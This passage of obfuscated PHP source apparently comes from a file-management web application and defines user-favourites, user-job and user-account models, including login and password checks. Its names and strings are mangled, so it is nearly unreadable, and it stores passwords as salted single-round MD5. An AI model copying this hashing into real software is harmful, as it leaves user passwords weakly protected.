$§ÑØö¦ƒ[$Ÿáñ†‡û[87]] = $áŠÕÓª·->getPathInner($§ÑØö¦ƒ[$Ÿáñ†‡û[87]]); $„úƒì‹ñ = $áŠÕÓª·->hashSimple($§ÑØö¦ƒ[$Ÿáñ†‡û[87]]); $åÉ¡¯ = $áŠÕÓª·->hashMd5($§ÑØö¦ƒ[$Ÿáñ†‡û[87]]); if (strlen($åÉ¡¯) > 10 && !isset($ÇÛí¡µ›[$åÉ¡¯])) { $ÇÛí¡µ›[$åÉ¡¯] = array(); } $§ÑØö¦ƒ[$Ÿáñ†‡û[672]] = $„úƒì‹ñ; $§ÑØö¦ƒ[$Ÿáñ†‡û[547]] = $åÉ¡¯; $ÇÛí¡µ›[$åÉ¡¯][] =& $§ÑØö¦ƒ; if (count($ÇÛí¡µ›[$åÉ¡¯]) > 1) { $§ÑØö¦ƒ[$Ÿáñ†‡û[670]] = !0; } Hook::trigger($Ÿáñ†‡û[673], $§ÑØö¦ƒ); } unset($§ÑØö¦ƒ); $ûóèˆñà = array($Ÿáñ†‡û[547] => array($Ÿáñ†‡û[7], array_keys($ÇÛí¡µ›))); $ÌêÚî = Model($Ÿáñ†‡û[674]); $’Êñş¯ë = $ÌêÚî->where($ûóèˆñà)->select(); $’Êñş¯ë = $’Êñş¯ë ? $’Êñş¯ë : array(); foreach ($’Êñş¯ë as $ÙÍ¸Ô©ğ) { if (!isset($ÇÛí¡µ›[$ÙÍ¸Ô©ğ[$Ÿáñ†‡û[547]]])) { continue; } $ıäÌ”Šœ = $ÇÛí¡µ›[$ÙÍ¸Ô©ğ[$Ÿáñ†‡û[547]]]; foreach ($ıäÌ”Šœ as &$§ÑØö¦ƒ) { $§ÑØö¦ƒ[$Ÿáñ†‡û[541]] = $ÙÍ¸Ô©ğ[$Ÿáñ†‡û[541]]; $§ÑØö¦ƒ[$Ÿáñ†‡û[670]] = !0; } unset($§ÑØö¦ƒ); } $Î‘×¸ôš = array(); foreach ($ÕäªäÃª as $ÄÌÑÌÙø) { Hook::trigger($Ÿáñ†‡û[675], $ÄÌÑÌÙø); if (isset($ÄÌÑÌÙø[$Ÿáñ†‡û[670]]) && $ÄÌÑÌÙø[$Ÿáñ†‡û[670]]) { Hook::trigger($Ÿáñ†‡û[676], $ÄÌÑÌÙø); continue; } $»ƒ„©¥Í = $áŠÕÓª·->getPathInner($ÄÌÑÌÙø[$Ÿáñ†‡û[87]]); $êœ¬ô‚Ô = $ÌêÚî->addFileMake($»ƒ„©¥Í, $ÄÌÑÌÙø[$Ÿáñ†‡û[79]], $ÄÌÑÌÙø[$Ÿáñ†‡û[672]], $ÄÌÑÌÙø[$Ÿáñ†‡û[547]], $ÄÌÑÌÙø[$Ÿáñ†‡û[32]], $¬Úê†¨); Hook::trigger($Ÿáñ†‡û[676], $ÄÌÑÌÙø); if (!is_array($êœ¬ô‚Ô)) { continue; } $Î‘×¸ôš[] = $êœ¬ô‚Ô; } $ÌêÚî->addAll($Î‘×¸ôš); $ûóèˆñà = array($Ÿáñ†‡û[547] => array($Ÿáñ†‡û[7], array_keys($ÇÛí¡µ›))); $’Êñş¯ë = $ÌêÚî->where($ûóèˆñà)->select(); $’Êñş¯ë = $’Êñş¯ë ? $’Êñş¯ë : array(); foreach ($’Êñş¯ë as $ÙÍ¸Ô©ğ) { if (!isset($ÇÛí¡µ›[$ÙÍ¸Ô©ğ[$Ÿáñ†‡û[547]]])) { continue; } $şø»é¡Ú =& $ÇÛí¡µ›[$ÙÍ¸Ô©ğ[$Ÿáñ†‡û[547]]]; foreach ($şø»é¡Ú as &$§ÑØö¦ƒ) { $§ÑØö¦ƒ[$Ÿáñ†‡û[541]] = $ÙÍ¸Ô©ğ[$Ÿáñ†‡û[541]]; } unset($§ÑØö¦ƒ); } $¿ñ²™ı„ = array(); foreach ($ÕäªäÃª as $€ìÀ¡Ê¾) { $¿ñ²™ı„[$€ìÀ¡Ê¾[$Ÿáñ†‡û[32]]] = $€ìÀ¡Ê¾; } return $¿ñ²™ı„; } } define($_SERVER[²Ö÷öõ][677], $_SERVER[²Ö÷öõ][678]); $xawrckpljf = $_SERVER[²Ö÷öõ][679]; goto aÆÙ°ÆµÒ†; dæÆä…®–›: class UserFavModel extends ModelBase { protected $tableName = "\165\163\145\162\137\146\141\x76"; protected function cacheFunctionAlias($Œ“ĞÕ¼Ö) { $™š®ÙÜô =& $_SERVER[²Ö÷öõ]; return array($™š®ÙÜô[2095] => array(USER_ID, $™š®ÙÜô[2456])); } protected function listData() { $ëÆ¿€ =& $_SERVER[²Ö÷öõ]; $êšÑº¦‰ = array($ëÆ¿€[1771] => USER_ID, $ëÆ¿€[557] => 0); $±½²ÚÓŞ = $ëÆ¿€[2457]; $¿ğò¬±¼ = $this->field($±½²ÚÓŞ)->where($êšÑº¦‰)->order($ëÆ¿€[2458])->select(); return $¿ğò¬±¼ ? $¿ğò¬±¼ : array(); } protected function resetCache() { } protected function listView() { $ï³Ü³¼ø =& $_SERVER[²Ö÷öõ]; $óÚáÛë« = $this->listData(); $ÂëêÆ¸± = array_filter_by_field($óÚáÛë«, $ï³Ü³¼ø[33], $ï³Ü³¼ø[490]); $ì¶Ï÷ ı = array_to_keyvalue($ÂëêÆ¸±, $ï³Ü³¼ø[12], $ï³Ü³¼ø[87]); if (!$ì¶Ï÷ ı) { return $óÚáÛë«; } $†ÄÁ’À÷ = 2000; $ĞàÖöúâ = array($ï³Ü³¼ø[491] => array($ï³Ü³¼ø[492], $ì¶Ï÷ ı)); $…öÑÉÛŒ = Model($ï³Ü³¼ø[907])->listSource($ĞàÖöúâ, $†ÄÁ’À÷); $…öÑÉÛŒ = array_merge($…öÑÉÛŒ[$ï³Ü³¼ø[86]], $…öÑÉÛŒ[$ï³Ü³¼ø[85]]); $…öÑÉÛŒ = array_to_keyvalue($…öÑÉÛŒ, $ï³Ü³¼ø[193]); foreach ($óÚáÛë« as $óˆ˜¦ü => $ÕªÕÏçŠ) { $Ã µ¡Î¤ = $…öÑÉÛŒ[$ÕªÕÏçŠ[$ï³Ü³¼ø[87]]]; $Ã µ¡Î¤ = $Ã µ¡Î¤ ? $Ã µ¡Î¤ : array(); $óÚáÛë«[$óˆ˜¦ü] = array_merge($Ã µ¡Î¤, $ÕªÕÏçŠ); } return $óÚáÛë«; } protected function addFav($ê‹¹–ì, $¢…š³ä× = '', $Èğßˆ“õ = "\x73\157\x75\162\143\x65") { $İİòãÆø =& $_SERVER[²Ö÷öõ]; $™¥«‹ï = array($İİòãÆø[1771] => USER_ID, $İİòãÆø[557] => 0, $İİòãÆø[496] => $Èğßˆ“õ, $İİòãÆø[495] => $ê‹¹–ì); if ($this->where($™¥«‹ï)->find()) { return !1; } $™¥«‹ï = array($İİòãÆø[1771] => USER_ID, $İİòãÆø[557] => 0); $ÑŠŠìºÄ = $this->where($™¥«‹ï)->max($İİòãÆø[2004]); if (!$ÑŠŠìºÄ) { $ÑŠŠìºÄ = 0; } if (!$¢…š³ä× && $Èğßˆ“õ == $İİòãÆø[490]) { $âŒ²¶ú = Model($İİòãÆø[1428])->where(array($İİòãÆø[491] => $ê‹¹–ì))->find(); if (!$âŒ²¶ú) { return !1; } $¢…š³ä× = $âŒ²¶ú[$İİòãÆø[32]]; } $¢…š³ä× = $this->getAutoName($¢…š³ä×); $ûæ²ê = array($İİòãÆø[1771] => USER_ID, $İİòãÆø[557] => 0, $İİòãÆø[494] => $¢…š³ä×, $İİòãÆø[495] => $ê‹¹–ì, $İİòãÆø[496] => $Èğßˆ“õ, $İİòãÆø[1984] => $ÑŠŠìºÄ + 1); return $this->add($ûæ²ê); } protected function remove($¼ŠòÅø‰) { $ÄøåïÄ =& $_SERVER[²Ö÷öõ]; $Ú»ÇòÙñ = array($ÄøåïÄ[1771] => USER_ID, $ÄøåïÄ[493] => $¼ŠòÅø‰); return $this->where($Ú»ÇòÙñ)->delete(); } protected function removeByName($ÒÊæö›÷) { $õ¸Ä±ÍÆ =& $_SERVER[²Ö÷öõ]; $üáò¸¨‘ = array($õ¸Ä±ÍÆ[1771] => USER_ID, $õ¸Ä±ÍÆ[494] => $ÒÊæö›÷, $õ¸Ä±ÍÆ[557] => 0); return $this->where($üáò¸¨‘)->delete(); } protected function rename($ú³Ÿ±ºı, $«€üĞ’±) { $ÔìÕ…úà =& $_SERVER[²Ö÷öõ]; if ($ú³Ÿ±ºı == $«€üĞ’±) { return !1; } $±¸—‹Õ° = $this->getAutoName($«€üĞ’±); if ($«€üĞ’± != $±¸—‹Õ°) { return !1; } $æ·ı²å = array($ÔìÕ…úà[1771] => USER_ID, $ÔìÕ…úà[557] => 0, $ÔìÕ…úà[32] => $ú³Ÿ±ºı); return $this->where($æ·ı²å)->save(array($ÔìÕ…úà[32] => $«€üĞ’±)); } protected function resetSort($˜õË£“’) { $¦‚™Ê»£ =& $_SERVER[²Ö÷öõ]; $˜õË£“’ = is_array($˜õË£“’) ? $˜õË£“’ : array(); $ôˆœêì¢ = array($¦‚™Ê»£[1771] => USER_ID); for ($¦åëÜ—‡ = 0; $¦åëÜ—‡ < count($˜õË£“’); $¦åëÜ—‡++) { $ôˆœêì¢[$¦‚™Ê»£[493]] = $˜õË£“’[$¦åëÜ—‡]; $this->where($ôˆœêì¢)->save(array($¦‚™Ê»£[1984] => $¦åëÜ—‡ + 1)); } return !0; } protected function moveTop($›ªÂó”ô) { $·»‹¥¢ó =& $_SERVER[²Ö÷öõ]; $ãì®äÎŸ = array($·»‹¥¢ó[1771] => USER_ID, $·»‹¥¢ó[557] => 0); $Œ¡†€§ = $this->where($ãì®äÎŸ)->where(array($·»‹¥¢ó[32] => $›ªÂó”ô))->find(); if (!$Œ¡†€§) { return; } $‡Ã·ÔÂà = $this->field($·»‹¥¢ó[475])->where($ãì®äÎŸ)->order($·»‹¥¢ó[2458])->select(); $‡Ã·ÔÂà = array_to_keyvalue($‡Ã·ÔÂà, $·»‹¥¢ó[12], $·»‹¥¢ó[475]); $™ù¼Üì· = $‡Ã·ÔÂà; $‡Ã·ÔÂà = array_remove_value($‡Ã·ÔÂà, $Œ¡†€§[$·»‹¥¢ó[475]]); array_unshift($‡Ã·ÔÂà, $Œ¡†€§[$·»‹¥¢ó[475]]); return $this->resetSort($‡Ã·ÔÂà); } protected function moveBottom($óÀ„ã) { $è›Ì†ñ =& $_SERVER[²Ö÷öõ]; $²Ä«ğÏ = array($è›Ì†ñ[1771] => USER_ID, $è›Ì†ñ[557] => 0); $¥Õç¿•ş = $this->where($²Ä«ğÏ)->max($è›Ì†ñ[2004]); $Ô½®™†ˆ = array($è›Ì†ñ[2004] => $¥Õç¿•ş + 1); return $this->where($²Ä«ğÏ)->where(array($è›Ì†ñ[32] => $óÀ„ã))->save($Ô½®™†ˆ); } private function getAutoName($š·¬ƒëœ) { $”ë‰¶å  =& $_SERVER[²Ö÷öõ]; $ÓÛç”•ƒ = array($”ë‰¶å [1771] => USER_ID, $”ë‰¶å [557] => 0); $§Â§Š = $this->field($”ë‰¶å [32])->where($ÓÛç”•ƒ)->select(); $§Â§Š = array_to_keyvalue($§Â§Š, $”ë‰¶å [12], $”ë‰¶å [32]); if (!$§Â§Š || !in_array($š·¬ƒëœ, $§Â§Š)) { return $š·¬ƒëœ; } for ($»ê×µûå = 0; $»ê×µûå < count($§Â§Š); $»ê×µûå++) { if (!in_array($š·¬ƒëœ . "\x28{$»ê×µûå}\51", $§Â§Š)) { return $š·¬ƒëœ . "\x28{$»ê×µûå}\x29"; } } return $š·¬ƒëœ . "\x28{$»ê×µûå}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\x2e\x6a\x6f\142\x4c\151\163\x74"; public $field = array("\156\x61\x6d\x65", "\x64\145\163\143", "\163\157\162\164"); const JOB_KEY = "\x73\x65\x6c\146\x4a\157\142\114\151\163\164"; public function listData($ŒêêûÄ = false, $´‡†Ğ¤ = "\x73\x6f\x72\164", $±¢…Û˜ = false) { return parent::listData($ŒêêûÄ, $´‡†Ğ¤, $±¢…Û˜); } public function remove($†î¬¨Ÿ) { return parent::remove($†î¬¨Ÿ); } public function add($—öªÕ±î) { $Ã—œ·­³ =& $_SERVER[²Ö÷öõ]; if ($this->findByName($—öªÕ±î[$Ã—œ·­³[32]])) { return !1; } $—öªÕ±î[$Ã—œ·­³[2004]] = $this->getSort(); return parent::insert($—öªÕ±î); } private function getSort() { $›Ëø´èå =& $_SERVER[²Ö÷öõ]; $­§àÙò = parent::listData(); $ğõ¿ü‹Ê = array_to_keyvalue($­§àÙò, $›Ëø´èå[12], $›Ëø´èå[2004]); return empty($ğõ¿ü‹Ê) ? 0 : max($ğõ¿ü‹Ê) + 1; } public function update($âŒ›Š©, $´Õ§ö“¿) { $®ù‘ığ =& $_SERVER[²Ö÷öõ]; $–²á÷ñú = parent::listData($âŒ›Š©); $‡ÑÚí´µ = $this->findByName($´Õ§ö“¿[$®ù‘ığ[32]]); if (!$–²á÷ñú || $‡ÑÚí´µ && $‡ÑÚí´µ[$®ù‘ığ[475]] != $–²á÷ñú[$®ù‘ığ[475]]) { return !1; } return parent::update($âŒ›Š©, $´Õ§ö“¿); } public function setUserJob($›¥¢ñ€“, $Ëî¢´¤Ô) { $²ìßñ¡› =& $_SERVER[²Ö÷öõ]; if (!is_array($Ëî¢´¤Ô)) { $Ëî¢´¤Ô = array($Ëî¢´¤Ô); } $Ã´ö¢Å’ = parent::listData(); $¼¨©î€ = array_to_keyvalue($Ã´ö¢Å’, $²ìßñ¡›[32]); $ğ«é­×³ = $²ìßñ¡›[454]; foreach ($Ëî¢´¤Ô as $‚é–«ëë) { if ($¼¨©î€[$‚é–«ëë]) { $ğ«é­×³ .= $¼¨©î€[$‚é–«ëë][$²ìßñ¡›[475]] . $²ìßñ¡›[50]; } else { $Òê™¹Ù£ = $this->add($‚é–«ëë); $ğ«é­×³ .= $Òê™¹Ù£ . $²ìßñ¡›[50]; } } $ğ«é­×³ = rtrim($ğ«é­×³, $²ìßñ¡›[50]); Model($²ìßñ¡›[598])->metaSet($›¥¢ñ€“, self::JOB_KEY, $ğ«é­×³); } public function getUserJob($ÍùĞ‰âî) { $åÆÃ† = Model($_SERVER[²Ö÷öõ][598])->metaGet($ÍùĞ‰âî); return $this->getUserJobInfo($åÆÃ†[self::JOB_KEY]); } public function getUserJobInfo($”×ï ­ü) { $ĞÒçÍ– =& $_SERVER[²Ö÷öõ]; $¾ÎÜŒŒÛ = explode($ĞÒçÍ–[50], $”×ï ­ü); $´›ß—Å = parent::listData(); $´›ß—Å = array_remove_key($´›ß—Å, $ĞÒçÍ–[231]); $Ò ìæÔ = array(); foreach ($¾ÎÜŒŒÛ as $÷¥ıÅÛü) { if (isset($´›ß—Å[$÷¥ıÅÛü])) { $Ò ìæÔ[] = $´›ß—Å[$÷¥ıÅÛü]; } } return $Ò ìæÔ; } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72"; protected $tableMeta = array("\x74\x61\142\x6c\x65\116\x61\x6d\145" => "\x75\163\x65\x72\x5f\155\x65\164\x61", "\x6d\x65\x74\141\x46\151\145\154\x64" => "\165\163\x65\x72\111\104"); protected $simpleField = "\x75\163\x65\x72\111\x44\x2c\156\151\143\153\x4e\x61\x6d\145\x2c\156\141\155\145\x2c\x61\x76\141\164\x61\162\x2c\163\145\x78\54\x73\x74\141\x74\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ØßßÇ­€) { $Á ÏÌÄ =& $_SERVER[²Ö÷öõ]; $å¥Šå°ñ = $Á ÏÌÄ[2459]; return array($Á ÏÌÄ[2062] => array($ØßßÇ­€[0], $å¥Šå°ñ), $Á ÏÌÄ[2064] => array($ØßßÇ­€[0], $å¥Šå°ñ), $Á ÏÌÄ[2460] => array($ØßßÇ­€[0], $å¥Šå°ñ)); } protected function getInfo($’ÉÄÓÑĞ, $ÅÍÏç÷Ã = false) { $è ïäĞÁ = $this->getInfoSimple($’ÉÄÓÑĞ); if (!is_array($è ïäĞÁ)) { return array(); } if ($ÅÍÏç÷Ã) { return $this->_getInfoApply($è ïäĞÁ); } return $this->cacheFunctionGet($_SERVER[²Ö÷öõ][2066], $’ÉÄÓÑĞ); } protected function getInfoFull($ùùòò¸›, $Â·ƒÒ¬ = false) { $è¹ìŒ¯ò = $this->getInfoSimple($ùùòò¸›); if (!is_array($è¹ìŒ¯ò)) { return array(); } if ($Â·ƒÒ¬) { return $this->_getInfoApply($è¹ìŒ¯ò, !0); } return $this->cacheFunctionGet($_SERVER[²Ö÷öõ][2461], $ùùòò¸›); } private function _getInfoApply($ù—µÄ‘Ã, $ãÌÌ‘Òˆ = false) { $–É¦¥á¿ =& $_SERVER[²Ö÷öõ]; if (!$ù—µÄ‘Ã) { return $ù—µÄ‘Ã; } $›©ç€µš = md5($–É¦¥á¿[2462] . $ù—µÄ‘Ã[$–É¦¥á¿[975]] . $–É¦¥á¿[2463] . $ù—µÄ‘Ã[$–É¦¥á¿[32]]); $ù—µÄ‘Ã = $this->_listDataApplyItem($ù—µÄ‘Ã); $Üˆ—Ô¯¾ = Model($–É¦¥á¿[1428])->metaGet($ù—µÄ‘Ã[$–É¦¥á¿[90]][$–É¦¥á¿[193]]); $ù—µÄ‘Ã[$–É¦¥á¿[2464]] = $›©ç€µš; $ù—µÄ‘Ã[$–É¦¥á¿[90]][$–É¦¥á¿[2260]] = isset($Üˆ—Ô¯¾[$–É¦¥á¿[2261]]) ? $Üˆ—Ô¯¾[$–É¦¥á¿[2261]] : null; if ($ãÌÌ‘Òˆ) { $ù—µÄ‘Ã[$–É¦¥á¿[539]] = $this->metaGet($ù—µÄ‘Ã[$–É¦¥á¿[1780]]); } return $ù—µÄ‘Ã; } protected function getInfoSimple($™è×ôæù, $‰ïÇŠ = false) { $áÛÍŒ» =& $_SERVER[²Ö÷öõ]; if (!$™è×ôæù) { return array(); } if ($‰ïÇŠ) { $¦²Œçº± = $this->where(array($áÛÍŒ»[1780] => intval($™è×ôæù)))->find(); if (!is_array($¦²Œçº±)) { return array(); } $¦²Œçº±[$áÛÍŒ»[2465]] = Action($áÛÍŒ»[2466])->parseUrl($¦²Œçº±[$áÛÍŒ»[2465]]); return $¦²Œçº±; } return $this->cacheFunctionGet($áÛÍŒ»[2067], $™è×ôæù); } protected function getInfoSimpleOuter($ èÄ°”¡) { $Ï¥°Íë =& $_SERVER[²Ö÷öõ]; if (!$ èÄ°”¡ || $ èÄ°”¡ == 0) { return array($Ï¥°Íë[1780] => $Ï¥°Íë[228], $Ï¥°Íë[32] => $Ï¥°Íë[176] . LNG($Ï¥°Íë[2467]) . $Ï¥°Íë[178], $Ï¥°Íë[2465] => STATIC_PATH . $Ï¥°Íë[2468]); } $ƒ‹Åè¯Ö = $this->cacheFunctionGet($Ï¥°Íë[2067], $ èÄ°”¡); $ãöïÒ  = array_field_key($ƒ‹Åè¯Ö, explode($Ï¥°Íë[50], $this->simpleField)); if (!$ãöïÒ ) { return array($Ï¥°Íë[1780] => $Ï¥°Íë[1281], $Ï¥°Íë[32] => $Ï¥°Íë[176] . LNG($Ï¥°Íë[2469]) . $Ï¥°Íë[178], $Ï¥°Íë[2465] => STATIC_PATH . $Ï¥°Íë[2470]); } $ãöïÒ [$Ï¥°Íë[2465]] = Action($Ï¥°Íë[2466])->parseUrl($ãöïÒ [$Ï¥°Íë[2465]]); return $ãöïÒ ; } protected function groupUser($œùŒñ») { } public static function errorLang($ê¶îÕ‰›) { $½¬¡ùÕ¼ =& $_SERVER[²Ö÷öõ]; $ÜÆÇµğ = array(self::ERROR_USER_NOT_EXISTS => $½¬¡ùÕ¼[2471], self::ERROR_USER_PASSWORD_ERROR => $½¬¡ùÕ¼[2472], self::ERROR_USER_EXIST_NAME => $½¬¡ùÕ¼[2473], self::ERROR_USER_EXIST_PHONE => $½¬¡ùÕ¼[2474], self::ERROR_USER_EXIST_EMAIL => $½¬¡ùÕ¼[2475], self::ERROR_USER_LOGIN_LOCK => $½¬¡ùÕ¼[2476], self::ERROR_IP_NOT_ALLOW => $½¬¡ùÕ¼[2477], self::ERROR_USER_EXIST_NICKNAME => $½¬¡ùÕ¼[2478]); $°£‡ß‰ì = LNG($ÜÆÇµğ[$ê¶îÕ‰›]); if ($ê¶îÕ‰› == self::ERROR_USER_LOGIN_LOCK) { $¶åÑé´ = (int) Model($½¬¡ùÕ¼[2479])->get($½¬¡ùÕ¼[2480]); if ($¶åÑé´ > 60) { $°£‡ß‰ì = str_replace($½¬¡ùÕ¼[91], ceil($¶åÑé´ / 60), $°£‡ß‰ì); } } return $°£‡ß‰ì; } public function getInfoByMeta($Í¶š­“, $“Ô±¯­°) { $ü¥èç¥ê =& $_SERVER[²Ö÷öõ]; $ªîòÌÑš = Model($ü¥èç¥ê[2481])->where(array($ü¥èç¥ê[97] => $Í¶š­“, $ü¥èç¥ê[450] => $“Ô±¯­°))->find(); if ($ªîòÌÑš) { return $this->getInfo($ªîòÌÑš[$ü¥èç¥ê[1780]]); } return !1; } public function userLoginCheck($ÑÜı²‡¥, $šÄñÉÉÚ) { $Şˆù¯® =& $_SERVER[²Ö÷öõ]; $œß‡®š– = $this->userLoginFind($ÑÜı²‡¥); if (!$œß‡®š–) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($œß‡®š–[$Şˆù¯®[1780]], $šÄñÉÉÚ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($œß‡®š–[$Şˆù¯®[1780]]); } public function userLoginFind($ëà×¹“§) { $¸Ë§­¥º =& $_SERVER[²Ö÷öõ]; $Á°¾£öİ = array($¸Ë§­¥º[32] => $ëà×¹“§, $¸Ë§­¥º[2268] => $ëà×¹“§, $¸Ë§­¥º[381] => $ëà×¹“§, $¸Ë§­¥º[2482] => $ëà×¹“§, $¸Ë§­¥º[1086] => $¸Ë§­¥º[1088]); if ($this->nickNameRpt()) { unset($Á°¾£öİ[$¸Ë§­¥º[2268]]); } return $this->where($Á°¾£öİ)->find(); } public function clearCache($¦ôªäüª) { $Äà¨ûÅ =& $_SERVER[²Ö÷öõ]; $this->cacheFunctionClear($Äà¨ûÅ[2066], $¦ôªäüª); $this->cacheFunctionClear($Äà¨ûÅ[2067], $¦ôªäüª); $this->cacheFunctionClear($Äà¨ûÅ[2461], $¦ôªäüª); } public function userPasswordCheck($ÎÙæ¬œ¦, $Ñ¬Íá¹) { $Š³ÏĞ÷É =& $_SERVER[²Ö÷öõ]; $µ¸úàîú = $this->where(array($Š³ÏĞ÷É[1780] => intval($ÎÙæ¬œ¦)))->find(); $ŸùéÎºí = $this->metaGet($ÎÙæ¬œ¦); $æõöñ³¼ = isset($ŸùéÎºí[$Š³ÏĞ÷É[2483]]) ? $ŸùéÎºí[$Š³ÏĞ÷É[2483]] : $Š³ÏĞ÷É[12]; if (md5($æõöñ³¼ . trim($Ñ¬Íá¹)) !== $µ¸úàîú[$Š³ÏĞ÷É[975]]) { return !1; } return !0; } public function userAdd($òŒ¶²ôô) { $ãÜæ¾ =& $_SERVER[²Ö÷öõ]; $³ôÃıÌÏ = array($ãÜæ¾[494] => $òŒ¶²ôô[$ãÜæ¾[32]], $ãÜæ¾[2484] => $òŒ¶²ôô[$ãÜæ¾[2186]], $ãÜæ¾[2485] => isset($òŒ¶²ôô[$ãÜæ¾[381]]) ? $òŒ¶²ôô[$ãÜæ¾[381]] : $ãÜæ¾[12], $ãÜæ¾[2486] => isset($òŒ¶²ôô[$ãÜæ¾[2482]]) ? $òŒ¶²ôô[$ãÜæ¾[2482]] : $ãÜæ¾[12], $ãÜæ¾[2487] => isset($òŒ¶²ôô[$ãÜæ¾[2268]]) ? $òŒ¶²ôô[$ãÜæ¾[2268]] : $òŒ¶²ôô[$ãÜæ¾[32]], $ãÜæ¾[2488] => isset($òŒ¶²ôô[$ãÜæ¾[2465]]) ? $òŒ¶²ôô[$ãÜæ¾[2465]] : $ãÜæ¾[12], $ãÜæ¾[2489] => isset($òŒ¶²ôô[$ãÜæ¾[2490]]) ? $òŒ¶²ôô[$ãÜæ¾[2490]] : 1, $ãÜæ¾[2491] => $òŒ¶²ôô[$ãÜæ¾[975]], $ãÜæ¾[2068] => isset($òŒ¶²ôô[$ãÜæ¾[1966]]) ? $òŒ¶²ôô[$ãÜæ¾[1966]] : 1024 * 1024 * 20, $ãÜæ¾[2069] => 0, $ãÜæ¾[2492] => 0, $ãÜæ¾[2113] => isset($òŒ¶²ôô[$ãÜæ¾[833]]) ? $òŒ¶²ôô[$ãÜæ¾[833]] : 1); if (!empty($òŒ¶²ôô[$ãÜæ¾[1780]])) { $³ôÃıÌÏ[$ãÜæ¾[1780]] = $òŒ¶²ôô[$ãÜæ¾[1780]]; } $Õ¼¢¾ = $this->_checkExist($òŒ¶²ôô); if ($Õ¼¢¾ !== !0) { return $Õ¼¢¾; } if (!empty($³ôÃıÌÏ[$ãÜæ¾[2465]]) && strlen($³ôÃıÌÏ[$ãÜæ¾[2465]]) > 255) { $³ôÃıÌÏ[$ãÜæ¾[2465]] = $ãÜæ¾[12]; } $ô…äºÌÌ = $this->add($³ôÃıÌÏ); $¬ÅíÉÌ = array($ãÜæ¾[2491] => $³ôÃıÌÏ[$ãÜæ¾[975]], $ãÜæ¾[2487] => $³ôÃıÌÏ[$ãÜæ¾[2268]]); $this->userEdit($ô…äºÌÌ, $¬ÅíÉÌ); Model($ãÜæ¾[1428])->userRootAdd($ô…äºÌÌ); return $ô…äºÌÌ; } protected function userEditTest($ãääÆİ”, $í¶®°‘«) { return $this->call($_SERVER[²Ö÷öõ][2493], $ãääÆİ”, $í¶®°‘«); } protected function userEdit($åĞüŠâë, $Êù¢™ô±) { $´µ›ØŠÁ =& $_SERVER[²Ö÷öõ]; $íìÁêë = $this->getInfoSimple($åĞüŠâë); if (!$íìÁêë) { return !1; } $£ìæ­ö‰ = $this->_checkExist($Êù¢™ô±, $åĞüŠâë); if ($£ìæ­ö‰ !== !0) { return $£ìæ­ö‰; } if (isset($Êù¢™ô±[$´µ›ØŠÁ[975]]) && trim($Êù¢™ô±[$´µ›ØŠÁ[975]]) != $´µ›ØŠÁ[12]) { $Æ™Õ×Í = $this->metaGet($åĞüŠâë); if (empty($Æ™Õ×Í[$´µ›ØŠÁ[2483]])) { $Æ™Õ×Í[$´µ›ØŠÁ[2483]] = rand_string(10); Model($´µ›ØŠÁ[577])->metaSet($åĞüŠâë, $´µ›ØŠÁ[2483], $Æ™Õ×Í[$´µ›ØŠÁ[2483]]); } $Êù¢™ô±[$´µ›ØŠÁ[975]] = md5($Æ™Õ×Í[$´µ›ØŠÁ[2483]] . trim($Êù¢™ô±[$´µ›ØŠÁ[975]])); } else { unset($Êù¢™ô±[$´µ›ØŠÁ[975]]); } if (!empty($Êù¢™ô±[$´µ›ØŠÁ[2465]]) && strlen($Êù¢™ô±[$´µ›ØŠÁ[2465]]) > 255) { $Êù¢™ô±[$´µ›ØŠÁ[2465]] = $´µ›ØŠÁ[12]; } $this->where(array($´µ›ØŠÁ[1771] => $åĞüŠâë))->save($Êù¢™ô±); if (isset($Êù¢™ô±[$´µ›ØŠÁ[2268]])) { $this->setNamePinyin($åĞüŠâë, $Êù¢™ô±[$´µ›ØŠÁ[2268]]); } $this->clearCache($åĞüŠâë); return !0; } public function setNamePinyin($È›Ôü¡ø, $‘¨­·§Ó = false) { $²Óó¾ì¡ =& $_SERVER[²Ö÷öõ]; if (!$‘¨­·§Ó) { $İíÄÈò = $this->getInfoSimple($È›Ôü¡ø); $‘¨­·§Ó = $İíÄÈò[$²Óó¾ì¡[2268]] ? $İíÄÈò[$²Óó¾ì¡[2268]] : $İíÄÈò[$²Óó¾ì¡[32]]; } $²æú‚‡Ó = Model($²Óó¾ì¡[598]); if (!Input::check($‘¨­·§Ó, $²Óó¾ì¡[655])) { return $²æú‚‡Ó->metaSet($È›Ôü¡ø, array($²Óó¾ì¡[538] => $²Óó¾ì¡[12], $²Óó¾ì¡[537] => $²Óó¾ì¡[12])); } return $²æú‚‡Ó->metaSet($È›Ôü¡ø, array($²Óó¾ì¡[538] => str_replace($²Óó¾ì¡[53], $²Óó¾ì¡[12], Pinyin::get($‘¨­·§Ó)), $²Óó¾ì¡[537] => Pinyin::get($‘¨­·§Ó, $²Óó¾ì¡[656]))); } private function nickNameRpt() { $Û­…ôë =& $_SERVER[²Ö÷öõ]; $ì—îŸ³ = Model($Û­…ôë[853])->get($Û­…ôë[2494]); $ç¸¡®‘ô = $GLOBALS[$Û­…ôë[6]][$Û­…ôë[457]][$Û­…ôë[2494]]; $ÃÃ›³  = !is_null($ì—îŸ³) ? $ì—îŸ³ : $ç¸¡®‘ô; return !!$ÃÃ›³ ; } private function _checkExist($¾»´ŸÎ•, $ù§—”“û = false) { $ØœŒ™¨´ =& $_SERVER[²Ö÷öõ]; $ù›Û’« = array($ØœŒ™¨´[32] => UserModel::ERROR_USER_EXIST_NAME, $ØœŒ™¨´[2268] => UserModel::ERROR_USER_EXIST_NICKNAME, $ØœŒ™¨´[381] => UserModel::ERROR_USER_EXIST_EMAIL, $ØœŒ™¨´[2482] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ù›Û’«[$ØœŒ™¨´[2268]]); } $Ó ³‘¥ù = $ù§—”“û ? array($ØœŒ™¨´[1780] => array($ØœŒ™¨´[2495], $ù§—”“û)) : array(); foreach 